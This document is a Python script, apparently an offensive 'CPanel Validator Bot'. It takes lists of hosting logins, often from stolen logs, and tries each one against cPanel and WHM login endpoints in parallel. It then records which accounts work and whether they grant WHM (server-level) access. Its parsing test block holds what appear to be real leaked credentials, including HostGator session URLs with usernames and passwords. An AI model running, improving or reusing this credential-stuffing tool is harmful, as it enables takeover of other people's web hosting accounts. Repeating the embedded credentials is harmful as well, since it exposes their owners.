#!/usr/bin/env python3
"""
Bot Name: CPanel Credential Checker
Description: Validates CPanel credentials by attempting to log in
"""
import argparse
import sys
import time
import random
import re
import socket
import json
import os
import threading
from threading import Thread
from multiprocessing.pool import ThreadPool
import urllib3
import requests

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CpanelChecker:
    def __init__(self, output_file, verbose=True):
        """Initialize the CPanel checker with default settings"""
        self.header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        }
        self.counter = 1
        self.valid_results = []
        self.verbose = verbose
        self.output_file = output_file
        self.output_lock = threading.Lock()
        # Keep track of domains already processed to avoid duplicates
        self.processed_domains = set()
        
    def log(self, message):
        """Print log messages if verbose mode is enabled"""
        if self.verbose:
            print(message)
    
    def allow_redirects(self, url):
        """Follow redirects and return the final URL"""
        try:
            req = requests.get(url, allow_redirects=True, headers=self.header, timeout=5, verify=False)
            return str(req.url)
        except Exception as e:
            self.log(f"Error following redirects for {url}: {str(e)}")
            return str(url)

    def domain_check(self, url):
        """Check if a domain is resolvable"""
        try:
            addr = socket.gethostbyname(url)
            return 1
        except:
            return 0

    def parse_credential(self, text):
        """Parse credential text into URL, username, and password using reverse method"""
        try:
            # Log the credential being parsed for debugging
            self.log(f"Parsing credential: {text}")
            
            # Handle pipe-delimited format first
            if '|' in text and text.count('|') == 2:
                parts = text.split('|')
                domain = parts[0]
                user = parts[1]
                password = parts[2]
                
                # Extract the base domain (without protocol, port, or path)
                if "://" in domain:
                    domain = domain.split("://")[1]
                
                # Remove port and path from domain
                if ":" in domain:
                    domain = domain.split(":")[0]
                elif "/" in domain:
                    domain = domain.split("/")[0]
                
                self.log(f"Parsed as pipe-delimited -> Domain: {domain}, User: {user}")
                return [domain, user, password]
            
            # For colon-delimited formats, parse from the end
            if ':' in text:
                # Find the positions of the last two colons
                last_colon_pos = text.rindex(':')
                # Extract password (everything after the last colon)
                password = text[last_colon_pos + 1:]
                
                # Find the second-to-last colon
                second_last_colon_pos = text.rindex(':', 0, last_colon_pos)
                # Extract username (between the last two colons)
                user = text[second_last_colon_pos + 1:last_colon_pos]
                
                # Everything before the second-to-last colon is the URL
                url_part = text[:second_last_colon_pos]
                
                # Extract the base domain (without protocol, port, or path)
                domain = url_part
                if "://" in domain:
                    domain = domain.split("://")[1]
                
                # Remove port and path from domain
                if ":" in domain:
                    domain = domain.split(":")[0]
                elif "/" in domain:
                    domain = domain.split("/")[0]
                
                self.log(f"Parsed using reverse method -> Domain: {domain}, User: {user}")
                return [domain, user, password]
            
            # If we get here, no valid format was found
            self.log(f"Failed to parse credential: {text}")
            return None
                
        except Exception as e:
            self.log(f"Error parsing credential: {text}, Error: {str(e)}")
            return None


    def list_to_string(self, lists):
        """Convert dictionary to cookie string"""
        return ';'.join([str(elem) + "=" + str(elem2) for elem, elem2 in lists.items()])

    def combine_ip(self, url, url2):
        """Check if two domains resolve to the same IP"""
        try:
            ip1 = socket.gethostbyname(url)
            ip2 = socket.gethostbyname(url2)
            return 1 if str(ip1) == str(ip2) else 0
        except:
            return 0

    def check_whm_access(self, url, user, password):
        """Check if credentials work for WHM access"""
        try:
            post = {
                "user": user,
                "pass": password,
                "goto_uri": "/"
            }
            login_whm = requests.post(url, data=post, headers=self.header, timeout=5, verify=False)
            return 1 if login_whm.status_code != 401 else 0
        except:
            return 0

    def get_cpanel_domain(self, url):
        """Get the domain from CPanel API"""
        try:
            get_domain_data = requests.get(url, headers=self.header, timeout=10, verify=False)
            json_domain = json.loads(get_domain_data.text)
            cpanel_domain = json_domain["data"][0]["domain"]
            return cpanel_domain
        except:
            return "NOT FOUND DOMAIN"

    def get_cpanel_login(self, url, user, password):
        """Attempt to login to CPanel and get session data"""
        try:
            post = {
                "user": user,
                "pass": password,
                "goto_uri": "/"
            }
            
            # Ensure URL doesn't end with double slashes
            login_url = url.rstrip('/') + "/login/?login_only=1"
            
            self.log(f"Attempting login to: {login_url}")
            get_cookies = requests.post(login_url, data=post, headers=self.header, timeout=15, verify=False)

            if "redirect" in get_cookies.text:
                json_do = json.loads(get_cookies.text)
                redirect_link = json_do["redirect"]

                try:
                    get_domain_value = json_do["security_token"] + "/execute/Resellers/list_accounts"
                    cookies = self.list_to_string(get_cookies.cookies.get_dict())
                except:
                    cookies = 0

                return [get_domain_value, cookies]
            else:
                return []
        except Exception as e:
            self.log(f"Login error: {str(e)}")
            return []

    def sanitize_string(self, text):
        """Remove or replace characters that might cause encoding issues"""
        if not text:
            return ""
        # Replace non-ASCII characters with '?'
        return ''.join(c if ord(c) < 128 else '?' for c in text)

    def write_result_to_file(self, result):
        """Write a valid result to the output file in real-time"""
        try:
            with self.output_lock:
                with open(self.output_file, 'a', encoding='utf-8') as f:
                    f.write(result + '\n')
                    f.flush()  # Ensure it's written immediately
        except Exception as e:
            self.log(f"Error writing to output file: {str(e)}")

    def check_cpanel_with_protocol(self, domain, username, password, protocol, original_text):
        """Check CPanel credentials with a specific protocol"""
        try:
            # Construct URL with protocol and port
            url = f"{protocol}{domain}:2083"
            
            # Ensure URL has correct format (no double slashes)
            url = url.rstrip('/') + "/"
            
            self.log(f"Constructed URL for login: {url}")

            # Try to login
            get_login_details = self.get_cpanel_login(url, username, password)

            if len(get_login_details) == 2:
                try:
                    get_domain_value = get_login_details[0]
                    cookies = get_login_details[1]
                except:
                    cookies = 0

                self.header["Cookie"] = cookies
                cpanel_domain = self.get_cpanel_domain(url + get_domain_value)
                
                whm_url = url.replace("2083", "2087").replace("2082", "2086").rstrip('/') + "/login/?login_only=1"
                whm_access = self.check_whm_access(whm_url, username, password)
                
                try:
                    our_domain = re.findall("//(.*?)/", url)[0].split(":")[0]
                except:
                    our_domain = url.replace("https://", "").replace("http://", "").split(":")[0]

                domain_works = self.domain_check(cpanel_domain) and self.combine_ip(cpanel_domain, our_domain)
                
                # Format result
                if domain_works:
                    if whm_access:
                        result = f"{original_text}   [{protocol}{domain}][{cpanel_domain}][DOMAIN WORK][WHM]"
                    else:
                        result = f"{original_text}   [{protocol}{domain}][{cpanel_domain}][DOMAIN WORK][CPANEL]"
                else:
                    if whm_access:
                        result = f"{original_text}   [{protocol}{domain}][{cpanel_domain}][DOMAIN NOT WORK][WHM]"
                    else:
                        result = f"{original_text}   [{protocol}{domain}][{cpanel_domain}][DOMAIN NOT WORK][CPANEL]"
                
                # Sanitize the result to avoid encoding issues
                sanitized_result = self.sanitize_string(result)
                
                self.log(f"[{self.counter}][WORK] => {url} [{cpanel_domain}][{'DOMAIN WORK' if domain_works else 'DOMAIN NOT WORK'}][{'WHM' if whm_access else 'CPANEL'}]")
                self.valid_results.append(sanitized_result)
                
                # Write result to file in real-time
                self.write_result_to_file(sanitized_result)
                
                return True
            else:
                self.log(f"[{self.counter}][NOT WORK] => {url}")
                return False
                
        except Exception as e:
            self.log(f"Error checking {protocol}{domain}: {str(e)}")
            return False

    def check_cpanel(self, text):
        """Check if CPanel credentials are valid by trying both HTTP and HTTPS"""
        try:
            # Parse credential
            data = self.parse_credential(text)
            if not data:
                return False
            
            domain, username, password = data
            
            # Create a unique identifier for this credential
            # This helps prevent duplicate entries for the same domain/username/password
            credential_id = f"{domain}:{username}:{password}"
            
            # Check if we've already processed this credential successfully
            with self.output_lock:
                if credential_id in self.processed_domains:
                    self.log(f"[{self.counter}][SKIP] => {domain} (already processed successfully)")
                    self.counter += 1
                    return True
            
            # Try HTTPS first, then HTTP if HTTPS fails
            protocols = ["https://", "http://"]
            success = False
            
            for protocol in protocols:
                self.log(f"Trying {protocol} for {domain}")
                if self.check_cpanel_with_protocol(domain, username, password, protocol, text):
                    success = True
                    # Mark this credential as processed
                    with self.output_lock:
                        self.processed_domains.add(credential_id)
                    # If one protocol succeeds, don't try the other one
                    break
            
            if not success:
                self.log(f"[{self.counter}][NOT WORK] => {domain} (tried both HTTP and HTTPS)")
            
            self.counter += 1
            return success
                
        except Exception as e:
            self.log(f"[{self.counter}][FAILED] => Error: {str(e)}")
            self.counter += 1
            return False

def process_credentials(input_file, output_file, thread_count=10, verbose=True):
    """
    Process credentials from input file and save valid ones to output file
    
    Args:
        input_file (str): Path to file with credentials to check
        output_file (str): Path to save valid credentials
        thread_count (int): Number of concurrent threads
        verbose (bool): Whether to print detailed logs
    
    Returns:
        int: Number of valid credentials found
    """
    print(f"Starting CPanel credential check")
    print(f"Input file: {input_file}")
    print(f"Output file: {output_file}")
    
    # Create checker instance with output file path
    checker = CpanelChecker(output_file, verbose=verbose)
    
    try:
        # Read credentials with explicit UTF-8 encoding and error handling
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip()]
        
        print(f"Processing {len(credentials)} credentials with {thread_count} threads")
        
        # Process credentials in parallel
        pool = ThreadPool(thread_count)
        try:
            pool.map(checker.check_cpanel, credentials)
        finally:
            pool.close()
            pool.join()
        
        print(f"Validation complete. Found {len(checker.valid_results)} valid credentials.")
        print(f"Results saved to {output_file}")
        
        return len(checker.valid_results)
        
    except Exception as e:
        print(f"Error processing credentials: {str(e)}")
        return 0

def run_bot(input_file, output_file):
    """
    Entry point function that can be called when the bot is imported.
    
    Args:
        input_file (str): Path to the file containing credentials to check
        output_file (str): Path where valid credentials should be saved
    
    Returns:
        int: Return code (0 for success, non-zero for failure)
    """
    try:
        print(f"CPanel Checker Bot starting...")
        print(f"Input file: {input_file}")
        print(f"Output file: {output_file}")
        
        # Convert to absolute paths
        input_file = os.path.abspath(input_file)
        output_file = os.path.abspath(output_file)
        
        print(f"Using absolute paths:")
        print(f"Input file: {input_file}")
        print(f"Output file: {output_file}")
        
        # Validate input file
        if not os.path.exists(input_file):
            print(f"Error: Input file not found: {input_file}")
            # Create empty output file to indicate failure
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("# No valid credentials found - input file not found\n")
            return 1
        
        # Always create the output file, even if empty
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("# CPanel Checker Results\n")
            f.write(f"# Generated on {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Checking both HTTP and HTTPS protocols\n\n")
        
        valid_count = process_credentials(input_file, output_file)
        
        # If no valid credentials were found, write a message to the output file
        if valid_count == 0:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write("# No valid credentials found\n")
        
        # Verify the output file exists
        if os.path.exists(output_file):
            print(f"Confirmed output file exists: {os.path.getsize(output_file)} bytes")
        else:
            print(f"WARNING: Output file does not exist after processing")
            # Try to create it again if it doesn't exist
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("# No valid credentials found\n")
        
        # Return success code 0 regardless of whether valid credentials were found
        # This ensures the bot is considered to have run successfully
        return 0
        
    except Exception as e:
        import traceback
        print(f"Error running bot: {str(e)}")
        print(traceback.format_exc())
        
        # Try to create output file with error information
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"# Error occurred during processing\n")
                f.write(f"# {str(e)}\n")
        except:
            print(f"Failed to create output file with error information")
            
        return 1

def test_credential_parsing():
    """Test function to verify credential parsing works correctly"""
    checker = CpanelChecker("test_output.txt", verbose=True)
    
    test_credentials = [
        "domain.com:username:password",
        "https://domain.com:username:password",
        "domain.com:2083:username:password",
        "https://domain.com:2083:username:password",
        "domain.com|username|password",
        "https://domain.com|username|password",
        "domain.com:2083|username|password",
        "domain.com|2083|username|password",
        "https://br1014.hostgator.com.br:2083/cpsess2431177631/frontend/hostgator_latam/sql/index.html:walter:flas3334",
        "https://ua831938.serversignin.com:2083:ua831938:HrgSGpMWZx49Ct7u",
        "https://br550.hostgator.com.br:2083/cpsess4168706408/frontend/paper_lantern/sql/index.html|master|password"
    ]
    
    print("=== TESTING CREDENTIAL PARSING ===")
    for cred in test_credentials:
        print(f"\nTesting: {cred}")
        result = checker.parse_credential(cred)
        if result:
            print(f"SUCCESS: Domain={result[0]}, User={result[1]}, Pass={result[2]}")
        else:
            print(f"FAILED to parse")
    print("=== END TESTING ===\n")

if __name__ == "__main__":
    # Display banner
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║             CPANEL VALIDATOR BOT              ║
    ║                                               ║
    ║  Checks if cpanel credentials are working     ║
    ║  and validates domain accessibility           ║
    ║  + Checks both HTTP and HTTPS protocols       ║
    ║  + Supports both ':' and '|' delimiters       ║
    ╚═══════════════════════════════════════════════╝
    """
    print(banner)
    
    # Uncomment to run parsing tests
    # test_credential_parsing()
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Check CPanel credentials')
    parser.add_argument('--input', required=True, help='Input file path containing credentials')
    parser.add_argument('--output', required=True, help='Output file path for valid credentials')
    parser.add_argument('--threads', type=int, default=50, help='Number of concurrent threads')
    
    args = parser.parse_args()
    
    # Run the bot and exit with appropriate code
    sys.exit(run_bot(args.input, args.output))
